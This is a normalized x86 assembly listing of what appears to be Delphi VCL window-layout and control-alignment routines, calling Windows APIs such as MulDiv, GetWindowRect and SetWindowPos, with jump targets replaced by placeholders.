mov eax [ esi + 0x74 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov edx [ ebp - 0x14 ]
sub edx eax
add [ edi + 0xc ] edx
jmp r-xdata
mov edx 0x2
mov eax [ esi + 0x74 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov edx [ ebp - 0x10 ]
sub edx eax
sub [ edi ] edx
jmp r-xdata
mov edx 0x2
mov eax [ esi + 0x74 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov edx [ ebp - 0x10 ]
sub edx eax
add [ edi + 0x8 ] edx
jmp r-xdata
mov edx 0x2
mov eax [ esi + 0x74 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov edx [ ebp - 0x10 ]
sub edx eax
add [ edi + 0x8 ] edx
mov edx 0x3
mov eax [ esi + 0x74 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov edx [ ebp - 0x14 ]
sub edx eax
add [ edi + 0xc ] edx
movzx eax [ r-xdata ]
and al [ esi + 0x61 ]
movzx edx [ r-xdata ]
cmp dl al
je r-xdata
mov eax [ esi + 0x184 ]
push eax
mov eax [ ebx ]
push eax
mov eax [ esi + 0x17c ]
push eax
call MulDiv
mov edx [ ebp - 0x10 ]
sar edx 0x1
jns r-xdata
mov eax [ esi + 0x188 ]
push eax
mov eax [ ebx + 0x4 ]
push eax
mov eax [ esi + 0x180 ]
push eax
call MulDiv
mov edx [ ebp - 0x14 ]
sar edx 0x1
jns r-xdata
sub eax edx
mov [ ebp - 0x8 ] eax
adc edx 0x0
sub eax edx
mov [ ebp - 0xc ] eax
adc edx 0x0
sub_4916e8
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_496c14
test al al
je r-xdata
mov ecx esi
mov edx [ ebx + 0x4c ]
mov eax [ ebx + 0x48 ]
call sub_432a5c
lea edx [ ebp - 0x10 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebp - 0x8 ]
mov [ esi ] eax
mov eax [ ebp - 0x4 ]
mov [ esi + 0x4 ] eax
jmp r-xdata
mov eax [ ebx + 0x1b4 ]
mov edx [ eax + 0x8 ]
add edx [ eax + 0x10 ]
sub [ esi ] edx
mov eax [ ebx + 0x1b4 ]
mov edx [ eax + 0xc ]
add edx [ eax + 0x14 ]
sub [ esi + 0x4 ] edx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_491748
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov [ ebp - 0x5 ] cl
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
movzx edx [ ebp - 0x5 ]
cmp edx 0x6
ja r-xdata
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
jmp [ edx * 4 + jump_table_49176e ]
mov edx 0x1
mov eax [ esi + 0x74 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov ebx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x74 ]
mov edx 0x1
mov ecx [ eax ]
call [ ecx + 0x10 ]
cmp ebx eax
setl al
jmp r-xdata
mov edx 0x1
mov eax [ esi + 0x74 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov ebx eax
mov edx 0x3
mov eax [ esi + 0x74 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
add ebx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x74 ]
mov edx 0x1
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov esi eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x74 ]
mov edx 0x3
mov ecx [ eax ]
call [ ecx + 0x10 ]
add esi eax
cmp ebx esi
setge al
jmp r-xdata
xor edx edx
mov eax [ esi + 0x74 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov ebx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x74 ]
xor edx edx
mov ecx [ eax ]
call [ ecx + 0x10 ]
cmp ebx eax
setl al
jmp r-xdata
xor edx edx
mov eax [ esi + 0x74 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov ebx eax
mov edx 0x2
mov eax [ esi + 0x74 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
add ebx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x74 ]
xor edx edx
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov esi eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x74 ]
mov edx 0x2
mov ecx [ eax ]
call [ ecx + 0x10 ]
add esi eax
cmp ebx esi
setge al
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx [ ebp - 0x4 ]
mov edx esi
mov ebx [ eax ]
call [ ebx + 0xa8 ]
sub_491878
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov esi ecx
lea edi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx edx
mov esi eax
push ebx
lea eax [ ebp - 0x10 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0x18 ]
mov eax [ esi + 0x30 ]
call sub_4916e8
lea ecx [ ebp - 0x18 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx esi
call sub_4912d8
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4918c0
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ eax ]
call [ edx + 0x8 ]
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x10 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_492534
dec eax
test eax eax
jl r-xdata
test bl bl
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
inc eax
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
cmp bl [ eax + 0x5b ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
cmp [ eax + 0x57 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
inc eax
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x0
inc [ ebp - 0x4 ]
dec [ ebp - 0x8 ]
jne r-xdata
test bl bl
je r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
call sub_424590
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
test [ eax + 0x1c ] 0x10
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] bl
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ ebp - 0x4 ]
call sub_4246e8
lea ecx [ ebp - 0x18 ]
mov edx ebx
call sub_491878
pop ecx
inc [ ebp - 0x4 ]
dec [ ebp - 0x8 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_4924f8
mov edi eax
cmp bl [ edi + 0x5b ]
jne r-xdata
mov eax edi
mov edx [ r-xdata ]
call sub_448388
test al al
je r-xdata
cmp [ edi + 0x57 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
test [ eax + 0x51 ] 0x4
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp edi [ eax - 0x10 ]
je r-xdata
test [ edi + 0x1c ] 0x10
jne r-xdata
mov eax [ r-xdata ]
and eax [ edi + 0x50 ]
mov edx [ r-xdata ]
cmp edx eax
je r-xdata
xor esi esi
jmp r-xdata
test [ edi + 0x1c ] 0x10
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
cmp esi [ eax + 0x8 ]
jge r-xdata
test [ edi + 0x51 ] 0x4
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov ecx edi
mov edx esi
call sub_424768
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx esi
call sub_4246e8
mov edx eax
mov ecx ebx
mov eax edi
call sub_491748
pop ecx
test al al
je r-xdata
inc esi
sub_491a4c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
add edi 0xfffffffc
mov bl 0x1
mov eax [ edi ]
call sub_492534
mov esi eax
dec esi
cmp esi 0x0
jl r-xdata
xor ebx ebx
mov eax [ edi ]
mov edx esi
call sub_4924f8
cmp [ eax + 0x5b ] 0x0
jne r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn
mov eax [ edi ]
mov edx esi
call sub_4924f8
movzx edx [ r-xdata ]
cmp dl [ eax + 0x61 ]
jne r-xdata
dec esi
cmp esi 0xffffffff
jne r-xdata
sub_491aa0
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
xor eax eax
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_491d0a
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_448180
mov [ ebp - 0x8 ] eax
push 0x0
lea eax [ ebp - 0x4 ]
mov ecx 0x1
mov edx [ r-xdata ]
call sub_44b0f0
add esp 0x4
xor ecx ecx
push ebp
push sub_491ce7
push [ fs : ecx ]
mov [ fs : ecx ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_448180
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov [ edx + 0x1a0 ] eax
xor ecx ecx
push ebp
push sub_491c8f
push [ fs : ecx ]
mov [ fs : ecx ] esp
xor edx edx
push ebp
push sub_491c52
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
mov eax [ eax + 0x8 ]
dec eax
cmp eax 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
mov edx [ eax ]
call [ edx + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x1a0 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x14 ]
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx - 0x4 ]
mov [ ecx + 0x1a0 ] edx
mov edx [ ebp + 0x8 ]
mov [ edx - 0x14 ] eax
retn
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x1a0 ]
mov edx [ ebp - 0xc ]
mov [ edx + 0x1a0 ] eax
xor eax eax
push ebp
push sub_491bbe
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
call sub_492060
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_491bc5
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp eax [ ebp - 0xc ]
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x14 ]
cmp [ eax + edx * 4 ] 0xa
jge r-xdata
retn
mov eax [ ebp - 0xc ]
xor edx edx
mov [ eax + 0x1a0 ] edx
dec [ ebp - 0x10 ]
cmp [ ebp - 0x10 ] 0xffffffff
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
mov edx [ ebp - 0x10 ]
call sub_4246e8
mov [ ebp - 0xc ] eax
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_424744
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0xffffffff
je r-xdata
sub_491bc5
cmp [ ebp - 0x14 ] 0xffffffff
je r-xdata
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_424590
mov eax [ ebp - 0x4 ]
call sub_44af28
mov edx [ ebp - 0x8 ]
mov ebx [ edx + 0xc ]
cmp eax ebx
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x14 ]
inc [ eax + edx * 4 ]
dec [ ebp - 0x10 ]
cmp [ ebp - 0x10 ] 0xffffffff
jne r-xdata
push ebx
lea eax [ ebp - 0x4 ]
mov ecx 0x1
mov edx [ r-xdata ]
call sub_44b0f0
add esp 0x4
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
mov edx [ ebp - 0x10 ]
call sub_4246e8
mov [ ebp - 0xc ] eax
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_424744
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0xffffffff
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
mov edx [ eax ]
call [ edx + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x1a0 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x14 ]
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx - 0x4 ]
mov [ ecx + 0x1a0 ] edx
mov edx [ ebp + 0x8 ]
mov [ edx - 0x14 ] eax
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x1a0 ]
mov edx [ ebp - 0xc ]
mov [ edx + 0x1a0 ] eax
xor eax eax
push ebp
push sub_491bbe
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
call sub_492060
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_491bc5
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp eax [ ebp - 0xc ]
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x14 ]
cmp [ eax + edx * 4 ] 0xa
jge r-xdata
retn
mov eax [ ebp - 0xc ]
xor edx edx
mov [ eax + 0x1a0 ] edx
sub_491c96
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
dec eax
cmp eax 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_491cee
mov eax [ ebp - 0x8 ]
call sub_4481b0
retn
mov [ ebp - 0x10 ] eax
dec [ ebp - 0x10 ]
cmp [ ebp - 0x10 ] 0xffffffff
jne r-xdata
mov eax [ ebp - 0xc ]
mov si 0xffd0
call sub_4483f8
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x8 ]
call sub_4246e8
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0xc ]
test [ eax + 0x1c ] 0x1
jne r-xdata
sub_491d18
push ebp
mov ebp esp
add esp 0xffffffe8
push esi
mov esi [ ebp + 0x8 ]
add esi 0xfffffffc
mov eax [ esi ]
call sub_496868
push eax
call IsZoomed
test eax eax
je r-xdata
mov eax [ esi ]
mov si 0xffee
call sub_4483f8
mov eax [ esi ]
call sub_496868
push eax
call GetParent
test eax eax
jne r-xdata
lea eax [ ebp - 0x18 ]
push eax
mov eax [ esi ]
call sub_496868
push eax
call GetWindowRect
mov eax [ esi ]
mov eax [ eax + 0x48 ]
mov [ ebp - 0x4 ] eax
mov eax [ esi ]
mov eax [ eax + 0x4c ]
mov [ ebp - 0x8 ] eax
lea ecx [ ebp - 0x8 ]
lea edx [ ebp - 0x4 ]
mov eax [ esi ]
call sub_48fdbc
mov eax [ esi ]
mov eax [ eax + 0x48 ]
mov edx [ ebp - 0x10 ]
sub edx [ ebp - 0x18 ]
cmp eax edx
jne r-xdata
push 0x16
mov eax [ esi ]
mov eax [ eax + 0x4c ]
push eax
mov eax [ esi ]
mov eax [ eax + 0x48 ]
push eax
push 0x0
push 0x0
push 0x0
mov eax [ esi ]
call sub_496868
push eax
call SetWindowPos
mov edx [ esi ]
mov edx [ edx + 0x4c ]
mov ecx [ ebp - 0xc ]
sub ecx [ ebp - 0x14 ]
cmp edx ecx
jne r-xdata
pop esi
mov esp ebp
pop ebp
retn
cmp eax [ ebp - 0x4 ]
jne r-xdata
mov eax [ esi ]
mov eax [ eax + 0x4c ]
cmp eax [ ebp - 0x8 ]
je r-xdata
mov eax [ esi ]
mov edx [ eax ]
call [ edx + 0x58 ]
jmp r-xdata
sub_491de4
push ebp
mov ebp esp
add esp 0xffffffe8
push esi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1e4 ] 0x0
je r-xdata
push ebp
call sub_491a4c
pop ecx
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1e3 ] 0x0
je r-xdata
pop esi
mov esp ebp
pop ebp
retn
mov [ ebp - 0x15 ] 0x0
xor eax eax
mov [ ebp - 0x14 ] eax
xor edx edx
push ebp
push sub_491f98
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a0 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1c0 ] 0x0
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x90 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_448180
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_491f29
push [ fs : eax ]
mov [ fs : eax ] esp
push ebp
mov al 0x1
call sub_4918c0
pop ecx
push ebp
mov al 0x2
call sub_4918c0
pop ecx
push ebp
mov al 0x3
call sub_4918c0
pop ecx
push ebp
mov al 0x4
call sub_4918c0
pop ecx
push ebp
mov al 0x5
call sub_4918c0
pop ecx
push ebp
mov al 0x6
call sub_4918c0
pop ecx
push ebp
xor eax eax
call sub_4918c0
pop ecx
mov eax [ ebp - 0x4 ]
mov si 0xffc6
call sub_4483f8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_491f30
mov eax [ ebp - 0xc ]
call sub_4481b0
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c0 ]
xor edx edx
mov ecx [ eax ]
call [ ecx + 0x2c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_448180
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x14 ]
mov [ eax + 0x1a0 ] edx
cmp [ eax + 0x1a0 ] 0x0
je r-xdata
mov [ ebp - 0x15 ] 0x1
mov eax [ eax + 0x1a0 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x1a0 ] eax
jmp r-xdata
sub_491f30
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1e2 ] 0x0
je r-xdata
cmp [ ebp - 0x14 ] 0x0
je r-xdata
push ebp
call sub_491d18
pop ecx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ ebp - 0x14 ] 0x0
je r-xdata
mov eax [ ebp - 0x14 ]
cmp [ eax + 0x8 ] 0x0
jle r-xdata
cmp [ ebp - 0x15 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x1a0 ] edx
mov eax [ ebp - 0x14 ]
xor edx edx
mov [ ebp - 0x14 ] edx
call sub_4481b0
jmp r-xdata
push ebp
call sub_491aa0
pop ecx
retn
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x1a0 ] edx
sub_491fa4
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_496c14
test al al
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x8
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a4 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_492038
xor eax eax
push ebp
push sub_49202b
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea ecx [ ebp - 0x14 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x94 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
and [ eax + 0x54 ] 0xffef
mov eax [ ebp - 0x4 ]
call sub_492040
retn
mov eax [ ebp - 0x4 ]
or [ eax + 0x54 ] 0x10
jmp r-xdata
sub_492068
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_448180
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_49212d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_48d878
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
call sub_492534
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov eax [ ebp - 0xc ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_492134
mov eax [ ebp - 0xc ]
call sub_4481b0
retn
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_4924f8
mov edx eax
mov eax [ ebp - 0xc ]
call sub_424590
mov edx [ ebp - 0x8 ]
sub edx [ edi + 0x48 ]
sub edx [ edi + 0x40 ]
mov eax edi
call sub_48d590
push 0x0
mov edx esi
mov eax [ ebp - 0xc ]
call sub_4246e8
xor ecx ecx
mov edx 0xb03e
call sub_48f2b0
inc esi
dec ebx
jne r-xdata
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_4924f8
mov edi eax
mov eax [ edi + 0x4 ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x4 ]
jne r-xdata
sub_49213c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_492534
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_448180
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
call sub_492038
xor edx edx
push ebp
push sub_49222a
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
call sub_492534
mov edi eax
dec edi
test edi edi
jl r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffbf
call sub_4483f8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
jmp r-xdata
inc edi
xor ebx ebx
mov eax [ ebp - 0xc ]
mov esi [ eax + 0x8 ]
test esi esi
jg r-xdata
inc ebx
dec edi
jne r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_4924f8
mov edx eax
mov eax [ ebp - 0xc ]
call sub_424590
mov edx esi
dec edx
mov eax [ ebp - 0xc ]
call sub_4246e8
mov ebx eax
cmp [ ebx + 0x5b ] 0x3
jne r-xdata
mov eax [ ebp - 0xc ]
call sub_4481b0
mov eax [ ebp - 0x4 ]
call sub_492040
retn
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_4924f8
movzx eax [ eax + 0x5b ]
add al 0xfd
sub al 0x2
jae r-xdata
mov dl 0x3
mov eax ebx
call sub_48d260
mov dl 0x4
mov eax ebx
call sub_48d260
jmp r-xdata
mov eax [ ebp - 0xc ]
mov edx [ eax + 0x8 ]
dec edx
mov eax [ ebp - 0xc ]
call sub_4245dc
sub_492298
push ebx
push esi
mov ebx edx
mov esi eax
mov dl 0x1
mov eax esi
call sub_477028
test eax eax
je r-xdata
pop esi
pop ebx
retn
mov ecx ebx
mov edx esi
call sub_47bf94
sub_4922b8
push ebx
push esi
mov ebx edx
mov esi eax
test ebx ebx
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov edx [ r-xdata ]
call sub_448388
test al al
je r-xdata
lea eax [ esi + 0x1d4 ]
mov edx ebx
call sub_48c448
lea eax [ esi + 0x1d8 ]
mov edx ebx
call sub_48c448
lea eax [ esi + 0x1d0 ]
mov edx ebx
call sub_48c448
jmp r-xdata
mov [ ebx + 0x30 ] esi
sub_492304
push ebx
push esi
mov ebx edx
mov esi eax
mov eax ebx
mov edx [ r-xdata ]
call sub_448388
test al al
je r-xdata
lea eax [ esi + 0x1d4 ]
mov edx ebx
call sub_48c470
lea eax [ esi + 0x1d0 ]
mov edx ebx
call sub_48c470
lea eax [ esi + 0x1d8 ]
mov edx ebx
call sub_48c470
jmp r-xdata
xor eax eax
mov [ ebx + 0x30 ] eax
pop esi
pop ebx
retn
sub_49234c
push ebx
push esi
push edi
add esp 0xfffffff8
mov ebx edx
mov edi eax
mov edx edi
mov eax ebx
mov si 0xfff5
call sub_4483f8
mov [ esp ] ebx
mov [ esp + 0x4 ] edi
push 0x1
lea ecx [ esp + 0x4 ]
mov edx 0xb04c
mov eax edi
call sub_48f2b0
cmp edi [ esp + 0x4 ]
jne r-xdata
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
push 0x1
mov esi ebx
mov ecx esi
mov edx 0xb02c
mov eax edi
call sub_48f2b0
mov edx ebx
mov eax edi
call sub_4922b8
test [ ebx + 0x1c ] 0x2
jne r-xdata
push 0x1
mov ecx esi
mov edx 0xb036
mov eax edi
call sub_48f2b0
push 0x0
xor ecx ecx
mov edx 0xb009
mov eax ebx
call sub_48f2b0
push 0x0
xor ecx ecx
mov edx 0xb008
mov eax ebx
call sub_48f2b0
push 0x0
xor ecx ecx
mov edx 0xb023
mov eax ebx
call sub_48f2b0
push 0x0
xor ecx ecx
mov edx 0xb03d
mov eax ebx
call sub_48f2b0
push 0x0
xor ecx ecx
mov edx 0xb050
mov eax ebx
call sub_48f2b0
mov eax ebx
mov edx [ r-xdata ]
call sub_448388
test al al
je r-xdata
mov eax edi
call sub_496c14
test al al
je r-xdata
push 0x0
xor ecx ecx
mov edx 0xb011
mov eax ebx
call sub_48f2b0
mov eax edi
call sub_4930c8
jmp r-xdata
mov edx ebx
mov eax edi
call sub_491fa4
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
sub_49245c
push esi
push edi
push ebp
add esp 0xfffffff8
mov edi edx
mov esi eax
mov [ esp ] edi
mov [ esp + 0x4 ] esi
push 0x0
mov ebp edi
mov ecx ebp
mov edx 0xb036
mov eax esi
call sub_48f2b0
mov eax edi
mov edx [ r-xdata ]
call sub_448388
test al al
je r-xdata
mov eax esi
call sub_496c14
test al al
je r-xdata
mov dl 0x1
mov eax edi
call sub_492298
mov eax edi
mov edx [ eax ]
call [ edx + 0xb0 ]
jmp r-xdata
mov edx edi
mov eax esi
call sub_492304
push 0x0
mov ecx ebp
mov edx 0xb02c
mov eax esi
call sub_48f2b0
push 0x0
lea ecx [ esp + 0x4 ]
mov edx 0xb04c
mov eax esi
call sub_48f2b0
mov eax esi
call sub_492060
pop ecx
pop edx
pop ebp
pop edi
pop esi
retn
xor ecx ecx
movzx edx [ edi + 0x57 ]
mov eax edi
call sub_48e438
sub_4924f8
push ebx
push esi
push edi
push ebp
mov edi edx
mov ebx eax
mov ebp [ ebx + 0x1d4 ]
test ebp ebp
je r-xdata
xor esi esi
mov esi [ ebp + 0x8 ]
jmp r-xdata
mov edx edi
sub edx esi
mov eax [ ebx + 0x1d8 ]
call sub_4246e8
mov edx edi
mov eax ebp
call sub_4246e8
jmp r-xdata
cmp esi edi
jle r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
sub_492554
push ebx
push esi
push edi
push ebp
push ecx
mov esi edx
mov [ esp ] eax
mov eax [ esp ]
call sub_492534
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
xor edi edi
inc edi
dec ebx
jne r-xdata
mov edx edi
mov eax [ esp ]
call sub_4924f8
mov ebp eax
mov edx esi
mov eax [ ebp + 0x3c ]
call [ ebp + 0x38 ]
cmp [ esi + 0xc ] 0x0
jne r-xdata
sub_492594
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_48d1f8
cmp esi [ edi + 0x244 ]
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp bl 0x1
jne r-xdata
xor eax eax
mov [ edi + 0x244 ] eax
sub_4925c4
add esp 0xfffffff0
movzx edx dx
mov [ esp ] edx
xor edx edx
mov [ esp + 0x4 ] edx
xor edx edx
mov [ esp + 0x8 ] edx
xor edx edx
mov [ esp + 0xc ] edx
mov edx esp
call sub_492554
add esp 0x10
retn
sub_4925ec
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
